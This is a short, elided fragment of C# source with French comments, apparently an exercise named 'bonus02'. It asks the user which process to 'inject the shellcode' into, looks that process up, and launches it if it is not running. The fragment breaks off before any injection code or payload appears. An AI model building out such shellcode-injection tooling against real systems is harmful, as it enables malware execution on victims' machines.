...
namespace bonus02
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            // L'utilisateur encode le process dans lequel il souhaite faire l'injection
            Console.WriteLine("Dans quel process souhaitez-vous injecter le shellcode ? ");
            string targetProcessUser = Console.ReadLine();

            // On récupère les process cibles actifs qui corresponde à "targetProcessUser"
            Process[] processes = Process.GetProcessesByName(targetProcessUser);
            ...
            if (processes.Length == 0)
            {
                ...
                targetProcess.StartInfo.FileName = targetProcessUser + ".exe";
                targetProcess.Start();
            } else {
